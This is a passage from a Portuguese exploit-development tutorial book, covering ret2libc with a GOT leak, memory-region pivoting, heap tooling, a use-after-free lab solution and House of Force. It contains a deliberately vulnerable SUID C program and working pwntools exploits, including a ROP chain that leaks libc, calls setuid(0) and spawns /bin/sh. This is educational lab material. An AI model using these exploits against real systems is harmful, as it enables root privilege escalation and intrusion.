<code>puts = base + 0x1234</code>, <code>exit = base + 0x4321</code>, <code>system = base + offset</code>, etc...</p>
<p>Portanto, com <code>leak = puts</code> -&gt; <code>leak = base + 0x1234</code>
-&gt; <code>base = leak - 0x1234</code> -&gt; <code>base = leak - offset</code></p>
<p>Agora, basta criar outra payload e enviar o BoF de novo, so que com: setuid + conexão remota + system + exit</p>
<p>Ou o que raios a sua imaginação bolar :D</p>
<a class="header" href="print.html#exemplo-2" id="exemplo-2"><h1>Exemplo</h1></a>
<a class="header" href="print.html#vulnc" id="vulnc"><h2>vuln.c</h2></a>
<pre><code class="language-c">#include &lt;stdio.h&gt;
/*
gcc vuln.c -fno-stack-protector -no-pie -ggdb -z relro -z now -o vuln ;
sudo chown root vuln ; 
sudo chmod +s vuln ;
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space ;
checksec vuln ;
*/

/* 
O checksec deve dar:
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
void vuln() {
    puts(&quot;Ola :D ! Qual o seu nome?&quot;);

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
</code></pre>
<a class="header" href="print.html#exploit-1" id="exploit-1"><h2>exploit</h2></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

context.binary = elf = ELF(&quot;vuln&quot;)
libc = elf.libc
rop = ROP(elf)
io = process(elf.path)
io.recvline()

if args.SLEEP: sleep(5)

##################################################
# 
# A plt nao tem seu endereco afetado pelo ASLR
# 
# Entao podemos chamar uma funcao do libc por 
# meio dela, sem precisar de leak
#
# Assim, vamos chamar puts por meio da plt!
#
# Alem disso, a got tambem nao e afetada,
# e ela armazena o endereco das funcoes resolvidas
#
# E oq o puts vai printar? um valor da got!
# Assim, nos dando o leak do libc
#
##################################################

payload = b'A'*40 + flat(
    rop.find_gadget(['pop rdi', 'ret']).address,
    elf.got.puts,
    elf.plt.puts, # call puts(&quot;got.puts&quot;)
    elf.sym.vuln  # voltar pra vuln 
)

io.sendline(payload)

##################################################
#
# Receber leak
#
##################################################

libc.address = int(bytearray(
    io.recvline()[:-1:])[::-1].hex(),
    16) - libc.sym.puts

# &gt;&gt;&gt; leak                                      # Botei um valor qualquer 
#     b'\xf0\xb5[\x16\xc8\x7f\n'
#
# &gt;&gt;&gt; leak[:-1:]                                # Remover \n
#     b'\xf0\xb5[\x16\xc8\x7f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:]).hex()               # converter pra hexstring
#     'f0b55b16c87f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:])[::-1].hex()         # Little Endian
#     '7fc8165bb5f0'
#
# &gt;&gt;&gt; int(bytearray(leak[:-1:])[::-1].hex(),16) # int
#     140497345295856

# Em seguida, leak - offset_puts ===&gt; base_libc

log.success(&quot;Libc Leak: &quot;+hex(libc.address))

##################################################
#
# vuln parte 2, o retorno
#
##################################################

io.recvline()

payload = b'A'*40 + flat(
    # Privesc
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.setuid,
    
    # System
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b&quot;/bin/sh\x00&quot;)),
    libc.sym.system,

    # Exit
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.exit
)

io.sendline(payload)
io.interactive()
</code></pre>
<a class="header" href="print.html#bruteforce-32-bits" id="bruteforce-32-bits"><h1>Bruteforce (32 bits)</h1></a>
<p>Isso e uma tradução / resumo desse post <a href="https://www.nickgregory.me/security/2019/04/06/pivoting-around-memory/">nickgregory: pivoting-around-memory</a></p>
<p>Todos os créditos vao para o autor original! :D</p>
<a class="header" href="print.html#intro" id="intro"><h1>Intro</h1></a>
<p>Existem 4 regiões importantes quando exploitando um programa:</p>
<ul>
<li>O binário</li>
<li>Stack</li>
<li>LibC</li>
<li>Heap</li>
</ul>
<p>Em resumo:
<img src="./src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" />
<img src="https://raw.githubusercontent.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/main/src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" /></p>
<ul>
<li><a href="print.html#intro">Intro</a></li>
<li><a href="print.html#bin---libc--got">Bin -&gt; LibC : GOT</a></li>
<li><a href="print.html#libc---heap--main_arena-pointers">LibC &lt;-&gt; Heap : main_arena pointers</a></li>
<li><a href="print.html#stack---bin-eou-libc--ler-ret-salvo">Stack -&gt; Bin e/ou LibC : Ler ret salvo</a></li>
<li><a href="print.html#libc---stack--__libc_argv-ou-environ">LibC -&gt; Stack : __libc_argv ou environ</a></li>
<li><a href="print.html#libc---ld---bin">LibC -&gt; ld -&gt; Bin</a></li>
</ul>
<a class="header" href="print.html#bin---libc--got" id="bin---libc--got"><h1>Bin -&gt; LibC : GOT</h1></a>
<p>Se <code>PIE == False</code> ou se voce tem um leak da base do programa,
basta ler a GOT.</p>
<a class="header" href="print.html#libc---heap--main_arena-pointers" id="libc---heap--main_arena-pointers"><h1>LibC &lt;-&gt; Heap : main_arena pointers</h1></a>
<p>Se voce tem um read arbitrário ou read-after-free, voce pode
conseguir o endereço do libc se a arena for a main ...
normalmente como o <code>next</code> pointer nas <code>freelists</code></p>
<p>Seguindo o outro sentido, se voce consegue ler no libc, basta
ler <code>main_arena</code> para conseguir um pointer para o heap</p>
<a class="header" href="print.html#stack---bin-eou-libc--ler-ret-salvo" id="stack---bin-eou-libc--ler-ret-salvo"><h1>Stack -&gt; Bin e/ou LibC : Ler ret salvo</h1></a>
<p>Ler o valor do ret salvo pode te dar um pointer para uma função
do <code>bin</code> (derrotando <code>PIE</code>) ou para uma do <code>LibC</code> (ou de outra lib... o que pode ser util para a exploit chain)</p>
<a class="header" href="print.html#libc---stack--__libc_argv-ou-environ" id="libc---stack--__libc_argv-ou-environ"><h1>LibC -&gt; Stack : __libc_argv ou environ</h1></a>
<p>Se voce tem um read no <code>LibC</code>, voce pode ler os símbolos:
<code>__libc_argv</code> ou <code>environ</code>. Eles apontam para valores bem altos
na stack, e muitas vezes existe uma diferença <strong>ALEATORIA</strong>
(<code>ASLR</code>) entre eles e o <code>RSP</code>.</p>
<p>De qualquer maneira, voce tem um leak de um pointer na stack, e
pode iterar ate encontrar o ret salvo que aponta para
<code>__libc_start_main</code>, para encontrar a parte importante da stack.</p>
<a class="header" href="print.html#libc---ld---bin" id="libc---ld---bin"><h1>LibC -&gt; ld -&gt; Bin</h1></a>
<p>Nessa tecnica e nescessario passar por um nivel de abstracao, dado
que o <code>LibC</code> nao tem pointers para <code>Bin</code> ! Assim:</p>
<p><strong>LibC -&gt; ld</strong></p>
<p>O Linker Dinamico (<code>ld</code>) sempre esta na memoria e <code>LibC</code> sempre
contem pointers para ele: <code>GOT do libc -&gt; _dl_runtime_resolve</code></p>
<p>E na maior parte dos casos, <code>ld</code> esta em um offset constante em
relação ao <code>LibC</code> pois:</p>
<ul>
<li><code>mmap</code> usa valores alinhados a <code>PAGE_SIZE</code></li>
<li>Normalmente, <code>LibC</code> e <code>ld</code> costumam ser as 2 primeiras libs a
serem carregadas e portanto &quot;<code>mmap</code>adas&quot;</li>
</ul>
<p><strong>ld -&gt; Bin</strong></p>
<p>O valor <code>name</code> dentro do struct <code>_dl_rtld_libname</code> aponta para
<code>.interp</code>, mais especificamente para uma string com o <code>path</code> do
linker, assim, calculando o offset dela dentro de <code>.interp</code> e
consequentemente leakando a base do <code>Bin</code> .</p>
<a class="header" href="print.html#heap" id="heap"><h1>Heap</h1></a>
<ul>
<li><a href="print.html#setup">Setup</a>
<ul>
<li><a href="print.html#malloc_playground">malloc_playground</a></li>
<li><a href="print.html#pwndbg">Pwndbg</a></li>
<li><a href="print.html#villoc--dynamorio">Villoc + DynamoRIO</a></li>
</ul>
</li>
<li><a href="print.html#teoria">Teoria</a></li>
</ul>
<a class="header" href="print.html#setup-1" id="setup-1"><h1>Setup</h1></a>
<a class="header" href="print.html#malloc_playground" id="malloc_playground"><h2>malloc_playground</h2></a>
<p><code>git clone https://github.com/shellphish/how2heap.git</code></p>
<a class="header" href="print.html#pwndbg" id="pwndbg"><h2>Pwndbg</h2></a>
<ul>
<li>
<p>gdb base: <code>sudo apt-get install gdb</code></p>
</li>
<li>
<p>e os coisos de teste: <code>sudo apt-get install libc6-dbg libc6-dbg:i386 libc6-dbg:amd64</code> caso voce tambem queira arm, mips, sei la,....</p>
</li>
<li>
<p><a href="https://github.com/pwndbg/pwndbg">Github: pwndbg</a></p>
</li>
<li>
<p>ou <a href="https://github.com/apogiatzis/gdb-peda-pwndbg-gef">Github: gdb-peda-pwndbg-gef </a></p>
</li>
</ul>
<a class="header" href="print.html#villoc--dynamorio" id="villoc--dynamorio"><h2>Villoc + DynamoRIO</h2></a>
<ul>
<li><a href="https://github.com/DynamoRIO/dynamorio/releases">Github: DynamoRIO</a> Ai voce baixa a versão mais recente pra sua plataforma.</li>
<li><a href="https://github.com/wapiflapi/villoc/tree/master/tracers/dynamorio">Github: Villoc</a> e aqui as instruções para usar DynamoRIO</li>
</ul>
<p>Mas resumindo, voce baixa o <code>tar</code> do DynamoRIO, extrai em <code>/usr/bin</code> ou <code>local</code>,... ou onde voce preferir</p>
<p>E executa <code>export DYNAMORIO_HOME=/usr/bin/DynamoRIO/</code></p>
<p>Ai voce baixa <code>sudo apt-get install cmake</code></p>
<p>Em seguida voce baixa villoc usando <code>git</code> e executa</p>
<pre><code class="language-bash">git clone https://github.com/wapiflapi/villoc.git
cd villoc/tracers/dynamorio
./build.sh
</code></pre>
<p>Para usar usar basta substituir <code>./target</code> pelo programa e <code>bin64</code> por <code>bin32</code> caso necessário!</p>
<pre><code>$DYNAMORIO_HOME/bin64/drrun  -c villoc_tracer villoc.trace -- ./target

villoc.py villoc.trace out.html
</code></pre>
<a class="header" href="print.html#teoria-3" id="teoria-3"><h1>Teoria</h1></a>
<ul>
<li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html">1996: Doug Lea - A Memory Allocator</a></li>
<li><a href="https://heap-exploitation.dhavalkapil.com/">dhavalkapil: Heap Exploitation book</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">SploitFUN: sbrk</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">SploitFUN: Malloc</a></li>
<li><a href="https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html">GNU: malloc hooks</a></li>
<li><a href="https://linux.die.net/man/3/__malloc_hook">man: __malloc_hook</a></li>
<li><a href="https://stackoverflow.com/questions/120627/is-there-a-way-to-redefine-malloc-at-link-time-on-windows">stackoverflow: Is there a way to redefine malloc at link time on Windows?</a></li>
</ul>
<pre><code>2ef5c8cae179b2d1dcd9c94fec99254acc18e1db6340048293591d98aee2cadf  phoenix/amd64/heap-two
</code></pre>
<pre><code class="language-py">#!/usr/bin/python
from pwn import *
io = process(&quot;/opt/phoenix/amd64/heap-two&quot;)

def leak(report=True):
    io.recvuntil(&quot;auth = &quot;)
    leak_auth = int(io.recvuntil(',').split(',')[0], 16)
    io.recvuntil(&quot;service = &quot;)
    leak_serv = int(io.recvuntil(']\n').split(&quot;]&quot;)[0], 16)
    if report: 
        log.info(&quot;[ auth = {}, service = {} ]&quot;.format(hex(leak_auth), hex(leak_serv)))
    io.sendline(b&quot;&quot;)
    return (leak_auth, leak_serv)
def auth(name=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;auth &quot; + name)
def service(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;service&quot; + extra)
def reset(extra=b''):
    (leak_auth, leak_serv) = leak(False)
    log.info(&quot;Called free on &quot;+hex(leak_auth))
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;reset&quot; + extra)
def login(extra=b''):
    io.recvuntil(&quot;]\n&quot;)
    io.sendline(b&quot;login&quot; + extra)
    log.success(io.recvuntil(&quot;\n&quot;))

##################################################
auth(b&quot;A&quot;*32) # pointer auth
reset() # free, mas o pointer nao e destruido
service(b&quot;B&quot;*32) # Alloc overlap
leak()
login() # pointer usado after free, apontando para service
</code></pre>
<a class="header" href="print.html#house-of-force" id="house-of-force"><h1>House of Force</h1></a>
<ul>
<li><a href="print.html#house-of-force">House of Force</a></li>
<li><a href="print.html#teoria">Teoria</a></li>
<li><a href="print.html#va-wrap-around">VA Wrap-Around</a></li>
<li><a href="print.html#limita%C3%A7%C3%B5es">Limitações</a></li>
<li><a href="print.html#fontes-e-materiais-para-praticar">Fontes e Materiais para praticar</a></li>
</ul>
<a class="header" href="print.html#teoria-4" id="teoria-4"><h1>Teoria</h1></a>
<p>A técnica da House Of Force consiste em usar um heap overflow para alterar o
tamanho do top_chunk para o valor máximo ( 0xffffffffffffffff ) ... permitindo
que um malloc enorme seja alocado pelo top_chunk!</p>
<p>Esse chunk enorme ira cobrir a distancia entre o alvo e o heap atual!</p>
<pre><code class="language-py"> ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20)
|______________________________|
|                              |  
| Top size: 0x3c0              |  &lt;- Nao teve overflow
|______________________________|

 Agora, vamos usar o overflow para deixar o top_chunk.size gigante
 ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20 + p64(0xffffffffffffffff))
|______________________________|
|                              |  
| Top size: 0xffffffffffffffff |
|______________________________|

Agora, vamos alocar um chunk gigante!

Vamos supor que o heap começa em 0x40000 e o alvo esta em 0x60704

Alem disso, vamos supor que o top_size esta no endereço 0x400d0

Assim, queremos alocar um chunk que pare um pouco antes do alvo, 
esse chunk servira somente para &quot;andar ate la&quot;

Assim, quando alocarmos um chunk, ele vai ocupar a mesma posição que o alvo

&gt;&gt;&gt; hex((0x60704 - 0x20) - 0x400d0)
'0x20614'
 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |  &lt;- malloc(0x20614)
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4 -&gt; alvo - 0x20
|                              |  
| Top size: 0xfffffffffffdf9eb |
|______________________________|

Agora, um ultimo chunk para cobrir alvo

 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4
|             | Size: 0x30     |  
|                              | &lt;- malloc(0x28) 
|                              |  
|                              | ___ 0x60704 -&gt; alvo
|                              |  
|______________________________| ___ 0x60714 
|                              |  
| Top size: 0xfffffffffffdf9cb |
|______________________________|

Um edit no chunk pode alterar o alvo!

def Resumo():
    Chunk_1 -&gt; *top_size = 0xfff...
    Chunk_2 -&gt; gigante, usado para atravessar a distancia
    Chunk_3 -&gt; Pode alterar o alvo


Na pratica, o Chunk_3 talvez tenha um tamanho que 
voce nao controle! Ou, alguma outra limitação assim!

A situação ideal ocorre quando o inicio da user_data do Chunk_3 
coincide com o endereço do alvo! pois voce nao precisa usar 
padding para alcançar o alvo e portanto, nao arrisca 
danificar outras partes da memoria!

Então quando estiver praticando, vale a pena ficar brincando com o tamanho do 
Chunk_2 para acertar a mira direitinho :D
</code></pre>
<a class="header" href="print.html#va-wrap-around" id="va-wrap-around"><h1>VA Wrap-Around</h1></a>
<p>No caso anterior, o endereço do alvo era maior que o do heap!</p>
<p>heap: 0x40000 &lt;------&gt; alvo: 0x60704</p>
<p>E caso seja ao contrario? Vamos precisar dar uma volta no VA space!</p>
<blockquote>
<p>VA = Virtual Address = Endereço Virtual = 0x0000000000000000 ate 0xffffffffffffffff</p>
</blockquote>
<p>Os endereços no VA space dao um loop, assim:</p>
<blockquote>
<p>Se voce esta em 0xffffffffffffff45 e anda para frente, voce vai terminar em 0x0000000000000000a3 ! Dando uma volta no VA space!</p>
</blockquote>
<p>Nos podemos fazer o mesmo com o <code>Chunk_2</code> ! Permitindo que o <code>Chunk_3</code> fique
em um endereço anterior ao heap! :D</p>
<p>Para encontrar o tamanho do <code>Chunk_2</code> que possibilite isso, podemos usar a função:</p>
<pre><code class="language-py">def wrap(A,B):
    return (0xffffffffffffffff - A)+B
    #      || tamanho ate        || O quanto andar depois
    #      || O fim do VA space  || de dar o loop 
    
    # Com A = base_do_heap + quantidade_gasta = &amp;top_size
    # B = alvo - 0x20 (tamanho do Chunk_3)  
</code></pre>
<a class="header" href="print.html#limitações" id="limitações"><h1>Limitações</h1></a>
<ul>
<li>Requer um heap leak</li>
<li>Versão Glibc &lt; 2.29</li>
</ul>
<a class="header" href="print.html#fontes-e-materiais-para-praticar" id="fontes-e-materiais-para-praticar"><h1>Fontes e Materiais para praticar</h1></a>
<ul>
<li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c">shellphish/how2heap</a></li>
<li>La também tem o link pra alguns ctfs que usam house of force!</li>
<li><a href="https://www.udemy.com/share/1039QMBEYadFpWRXo=/">O curso de Heap Exploits do Max Kamper</a> </li>
</ul>
<a class="header" href="print.html#linux-internals" id="linux-internals"><h1>Linux Internals</h1></a>
<a class="header" href="print.html#prerequisitos" id="prerequisitos"><h1>Prerequisitos</h1></a>
<p>Tanto coisas que eu ja comentei nesse livrinho quanto coisas que deu preguiça..
. hehe</p>
<ul>
<li>Loader, Linker, GOT e PLT
<ul>
<li><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/">Anatomy of a program in memory</a></li>
<li><a href="https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/11/10/understanding-the-loader-part1-how-does-an-executable-get-loaded-to-memory.html">Understanding the Loader - Part1</a></li>
<li><a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT and GOT - the key to code sharing and dynamic libraries</a></li>
</ul>
</li>
<li>Syscalls
<ul>
<li><a href="https://man7.org/linux/man-pages/man2/syscall.2.html">man syscalls</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md">Em arquiteturas comuns</a></li>
</ul>
</li>
<li>Signals e Processos
<ul>
<li><a href="https://www.win.tue.nl/%7Eaeb/linux/lk/lk-5.html">The Linux kernel: Signals</a></li>
<li><a href="https://linoxide.com/how-tos/signal-handling-linux-signal-function/">Signal Handling In Linux Through The signal() Function</a></li>
</ul>
</li>
</ul>

                </div>

                <!-- Mobile navigation buttons -->
                

                

            </div>

            

            

        </div>


        <!-- Local fallback for Font Awesome -->
        <script>
            if ($(".fa").css("font-family") !== "FontAwesome") {
                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
            }
        </script>

        <!-- Livereload script (if served using the cli tool) -->
        

        

        

        
        <script>
            $(document).ready(function() {
                window.print();
            })
        </script>
        

        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS script -->
        

    </body>
</html>
